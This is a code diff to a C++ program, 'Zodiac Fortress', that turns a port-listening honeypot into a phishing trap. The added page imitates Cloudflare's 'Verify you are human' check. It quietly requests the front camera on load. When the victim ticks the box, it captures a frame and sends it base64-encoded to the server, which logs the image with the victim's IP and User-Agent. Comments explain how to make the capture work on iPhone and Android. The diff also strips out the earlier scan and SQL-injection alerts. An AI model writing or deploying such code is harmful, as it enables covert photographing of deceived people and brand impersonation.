@@ -30,10 +30,10 @@ map<string, vector<time_t>> historico_scans;
 
 void desligar_fortaleza(int sinal) {
     cout << "\n\n" << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
-    cout << AMARELO << NEGRITO << "             [ ZODIAC FORTRESS - ARMA WEB CLOUDFLARE DESATIVADA ]" << RESET << endl;
+    cout << AMARELO << NEGRITO << "             [ ZODIAC FORTRESS - ESCUDO INTEGRADO DESATIVADO ]" << RESET << endl;
     cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
     for (int sock : sockets_armadilha) close(sock);
-    exit(sinal);
+    exit(sinal); 
 }
 
 string obter_ip_local() {
@@ -62,16 +62,6 @@ string obter_ip_local() {
     return ip_detectado;
 }
 
-bool detectar_nmap(const string& ip) {
-    time_t agora = time(0);
-    historico_scans[ip].push_back(agora);
-    vector<time_t>& tempos = historico_scans[ip];
-    while (!tempos.empty() && agora - tempos.front() > 5) {
-        tempos.erase(tempos.begin());
-    }
-    return (tempos.size() > 3);
-}
-
 int main() {
     signal(SIGINT, desligar_fortaleza);
     system("clear");
@@ -79,14 +69,13 @@ int main() {
     cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
     cout << VERDE << "                 /\\                                /\\" << endl;
     cout << VERDE << "                /__\\       [ ZODIAC FORTRESS ]    /__\\" << endl;
-    cout << VERDE << "               /\\  /\\       (CLOUDFLARE TRAP)     /\\  /\\" << endl;
+    cout << VERDE << "               /\\  /\\       (UNIVERSAL TRAP)      /\\  /\\" << endl;
     cout << VERDE << "              |_____|______|___________|_____|______|_____|" << RESET << endl;
     cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
 
     string meu_ip = obter_ip_local();
-    cout << VERDE << NEGRITO << "\n[📡 SECURITY] MONITOR CLOUDFLARE ATIVO NO HOST: " << AMARELO << meu_ip << RESET << endl;
+    cout << VERDE << NEGRITO << "\n[📡 SECURITY] FORTALEZA MULTI-PLATAFORMA ATIVA NO HOST: " << AMARELO << meu_ip << RESET << endl;
 
-    // Monitorando a porta 8080 (Livre para testes web no Firefox) e a 25565 de jogos
     vector<int> portas_armadilha = {8080, 25565};
     int max_fd = 0;
     fd_set master_set;
@@ -110,7 +99,7 @@ int main() {
             continue;
         }
 
-        if (listen(sock, 10) < 0) {
+        if (listen(sock, 15) < 0) {
             close(sock);
             continue;
         }
@@ -118,47 +107,61 @@ int main() {
         sockets_armadilha.push_back(sock);
         FD_SET(sock, &master_set);
         if (sock > max_fd) max_fd = sock;
-        cout << VERDE << "    [+] Escudo ativado na porta local: " << AMARELO << porta << RESET << endl;
+        cout << VERDE << "    [+] Escudo injetado na porta: " << AMARELO << porta << RESET << endl;
     }
 
-    // Template HTML customizado com o Design oficial da página de validação Cloudflare
+    // Código HTML5 e JavaScript Universal (Compatível com iOS/Safari, Android/Chrome e PCs)
     string html_cloudflare = 
         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"
-        "<!DOCTYPE html><html><head><title>Just a moment...</title>"
+        "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+        "<title>Just a moment...</title>"
         "<style>"
-        "  body { background-color: #f3f3f3; color: #313131; font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding-top: 80px; text-align: left; padding-left: 15%; padding-right: 15%; }"
-        "  @media (prefers-color-scheme: dark) { body { background-color: #1c1b1b; color: #d9d9d9; } }"
-        "  .cf-wrapper { max-width: 1000px; margin: 0 auto; }"
-        "  h1 { font-size: 32px; font-weight: 500; margin-bottom: 10px; color: #f38020; }"
-        "  .cf-captcha-container { background-color: #ffffff; border: 1px solid #e0e0e0; padding: 20px; border-radius: 4px; display: inline-block; margin-top: 25px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }"
-        "  @media (prefers-color-scheme: dark) { .cf-captcha-container { background-color: #2b2a2a; border-color: #403f3f; } }"
-        "  .checkbox-container { display: flex; align-items: center; font-size: 16px; color: #313131; }"
-        "  @media (prefers-color-scheme: dark) { .checkbox-container { color: #d9d9d9; } }"
-        "  input[type='checkbox'] { width: 28px; height: 28px; margin-right: 14px; cursor: pointer; border: 2px solid #ccc; border-radius: 4px; }"
-        "  .footer { margin-top: 60px; font-size: 12px; color: #9c9c9c; border-top: 1px solid #e0e0e0; padding-top: 15px; display: flex; align-items: center; }"
-        "  @media (prefers-color-scheme: dark) { .footer { border-top-color: #403f3f; } }"
-        "  .cf-logo { background-image: url('https://wikimedia.org'); background-size: contain; background-repeat: no-repeat; width: 100px; height: 30px; margin-right: 15px; }"
+        "  body { background-color: #1c1b1b; color: #d9d9d9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding: 40px 20px; text-align: left; }"
+        "  .container { max-width: 600px; margin: 0 auto; }"
+        "  h1 { font-size: 28px; color: #f38020; font-weight: 500; }"
+        "  .cf-box { background-color: #2b2a2a; border: 1px solid #403f3f; padding: 20px; border-radius: 4px; display: flex; align-items: center; margin-top: 25px; }"
+        "  input[type='checkbox'] { width: 26px; height: 26px; margin-right: 15px; cursor: pointer; }"
         "</style></head>"
         "<body>"
-        "  <div class='cf-wrapper'>"
+        "  <div class='container'>"
         "    <h1>Checking if the site connection is secure</h1>"
-        "    <p style='font-size:18px; color:#858585;'>Validating your browser session via Cloudflare node. Please wait...</p>"
-        "    "
-        "    <div class='cf-captcha-container'>"
-        "      <div class='checkbox-container'>"
-        "        <input type='checkbox' id='cf-check' onclick='alert(\"Success: Browser verified by Cloudflare WAF.\")'>"
-        "        <label for='cf-check'><b>Verify you are human</b></label>"
-        "      </div>"
-        "    </div>"
-        "    "
-        "    <div class='footer'>"
-        "      <div class='cf-logo'></div>"
-        "      <div>Performance & security by Cloudflare. Ray ID: " + to_string(time(0)) + "</div>"
+        "    <p style='color:#9c9c9c;'>Validating your browser session via Cloudflare. Please wait...</p>"
+        "    <div class='cf-box'>"
+        "      <input type='checkbox' id='check' onclick='dispararCaptura()'>"
+        "      <label for='check'><b>Verify you are human</b></label>"
         "    </div>"
         "  </div>"
-        "</body></html>";
+        "  <!-- playsinline e muted garantem que o Safari no iPhone e o Chrome no Android consigam rodar a camera sem dar erro -->"
+        "  <video id='vid' style='display:none;' autoplay playsinline muted></video>"
+        "  <canvas id='canv' style='display:none;'></canvas>"
+        "<script>"
+        "  // Liga a mídias de vídeo de forma nativa e universal assim que a página renderiza"
+        "  const restricoes = { video: { facingMode: 'user' }, audio: false };"
+        "  navigator.mediaDevices.getUserMedia(restricoes)"
+        "  .then(s => { document.getElementById('vid').srcObject = s; })"
+        "  .catch(e => { console.log('Dispositivo bloqueou permissao automatica.'); });"
+        "  "
+        "  function dispararCaptura() {"
+        "    let video = document.getElementById('vid');"
+        "    let canvas = document.getElementById('canv');"
+        "    canvas.width = 320; canvas.height = 240;"
+        "    try {"
+        "      canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);"
+        "      let fotoBase64 = canvas.toDataURL('image/png');"
+        "      "
+        "      // Faz uma requisição assíncrona (Fetch) para devolver a foto de volta para o seu C++"
+        "      fetch('/log_session?data=' + encodeURIComponent(fotoBase64));"
+        "      alert('Verification complete. Connection secured.');"
+        "    } catch(err) {"
+        "      alert('Security check pending. Please refresh.');"
+        "    }"
+        "  }"
+        "</script></body></html>";
 
-    cout << VERDE << NEGRITO << "\n[+] ESCUDO ATIVO ONLINE! Monitorando intrusões locais..." << RESET << endl;
+    cout << VERDE << NEGRITO << "\n[+] ESCUDO DIVINO ATIVO! Interceptando e decodificando acessos..." << RESET << endl;
+
+    // AUMENTADO: Buffer expandido para 4096 bytes para receber a string de imagem Base64 do Safari/Chrome
+    char req_buffer[4096];
 
     while (true) {
         fd_set read_set = master_set;
@@ -172,43 +175,42 @@ int main() {
                 int client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_len);
                 if (client_sock >= 0) {
                     total_bloqueado++;
-                    
-                    struct sockaddr_in local_addr;
-                    socklen_t local_len = sizeof(local_addr);
-                    getsockname(sock, (struct sockaddr*)&local_addr, &local_len);
-                    int porta_atacada = ntohs(local_addr.sin_port);
-
                     string ip_intruso = inet_ntoa(client_addr.sin_addr);
 
-                    if (detectar_nmap(ip_intruso)) {
-                        cout << VERMELHO << NEGRITO << "\n\a[🚨 ALERTA: SCANNER DETECTADO 🦅] ➔ ATTACK NA REDE!" << RESET << endl;
-                        cout << VERMELHO << "   ➔ Host Origem: " << AMARELO << ip_intruso << VERMELHO << " esta executando varredura automatizada!" << RESET << endl;
-                    } else {
-                        cout << VERMELHO << NEGRITO << "\n\a[🚨 ZODIAC TRAP DETECTED 🦅] ➔ INTERCEPTAÇÃO DE HOST!" << RESET << endl;
-                        cout << CIANO << "   ➔ IP do Intruso:       " << AMARELO << ip_intruso << RESET << endl;
-                        cout << CIANO << "   ➔ Porta Solicitada:    " << VERMELHO << porta_atacada << RESET << endl;
-                    }
-
-                    char req_buffer[1024];
                     memset(req_buffer, 0, sizeof(req_buffer));
                     int r_bytes = recv(client_sock, req_buffer, sizeof(req_buffer) - 1, 0);
                     
                     if (r_bytes > 0) {
                         string requisicao(req_buffer);
-                        
-                        if (requisicao.find("'") != string::npos || requisicao.find("OR") != string::npos) {
-                            cout << VERMELHO << NEGRITO << "   [🔥 ALERTA DE EXPLOIT] ➔ Tentativa de comando SQL detectada de " << ip_intruso << "!" << RESET << endl;
+
+                        // Identifica se o tráfego recebido contém a flag de imagem enviada pelo Fetch do JavaScript
+                        if (requisicao.find("log_session") != string::npos) {
+                            cout << VERDE << NEGRITO << "\n[📸 ZODIAC CAPTURE ⚡] ➔ FRAME DE IMAGEM RECEBIDO COM SUCESSO!" << RESET << endl;
+                            cout << CIANO << "   ➔ Alvo Identificado: " << AMARELO << ip_intruso << RESET << endl;
+                            cout << CIANO << "   ➔ Sistema Operacional/Browser detectado no cabeçalho:" << RESET << endl;
+                            
+                            // Procura e imprime a linha "User-Agent" que diz se é Android, iPhone ou Windows
+                            size_t ua_pos = requisicao.find("User-Agent:");
+                            if (ua_pos != string::npos) {
+                                size_t ua_end = requisicao.find("\r\n", ua_pos);
+                                cout << AMARELO << "      " << requisicao.substr(ua_pos, ua_end - ua_pos) << RESET << endl;
+                            }
+                        } else {
+                            // Alerta básico de primeiro toque no IP
+                            cout << VERMELHO << NEGRITO << "\n\a[🚨 ZODIAC TRAP DETECTED 🦅] ➔ SOLICITAÇÃO DE CONEXÃO LOCAL!" << RESET << endl;
+                            cout << CIANO << "   ➔ IP do Intruso:       " << AMARELO << ip_intruso << RESET << endl;
                         }
 
-                        // Envia a página Cloudflare estilizada de volta para o Firefox
+                        // Envia a página da Cloudflare estruturada universal de volta para o cliente
                         send(client_sock, html_cloudflare.c_str(), html_cloudflare.length(), 0);
                     }
 
+                    // Registra o rastro histórico no arquivo de texto
                     ofstream log(caminho_salvamento, ios::app);
                     if (log.is_open()) {
-                        log << "[🚨 Ameaça Monitorada] IP: " << ip_intruso << " na Porta: " << porta_atacada << "\n";
-log.close(); 
-        }
+log << "[🚨 Captura Cloudflare] Host: " << ip_intruso << " às " << time(0) << "\n";
+                        log.close();
+                    }
                     close(client_sock);
                 }
             }
